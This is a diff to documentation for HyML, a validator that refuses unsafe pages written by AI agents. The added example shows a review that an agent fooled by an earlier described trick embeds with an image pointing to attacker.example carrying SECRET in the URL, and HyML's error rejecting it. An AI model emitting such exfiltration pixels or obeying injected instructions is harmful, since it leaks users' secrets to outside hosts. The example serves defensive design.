@@ -63,7 +63,14 @@ The agent writes its page either in the s-expression notation above or as JSON, 
 - **Nothing loads from outside without permission.** Images and other resources that a browser fetches by itself must come from the same site, or from sites you list as allowed. This is the rule that stops the leak described above. Forms may not send their contents to other sites either.
 - **Every problem is reported, not quietly removed.** A sanitizer deletes what it does not like and returns what is left, so the agent never learns that anything went wrong. HyML instead refuses the whole page and lists every problem with its place in the page.
 
-For example, an agent that falls for the trick above gets this answer back.
+For example, an agent that falls for the trick above might put the attacker's image into a review like this.
+
+```
+(p "Great shoes!"
+   (img :src "https://attacker.example/pixel?d=SECRET"))
+```
+
+HyML refuses to render it and answers with this.
 
 ```
 p > img[2]: src='https://attacker.example/pixel?d=SECRET' loads an external resource
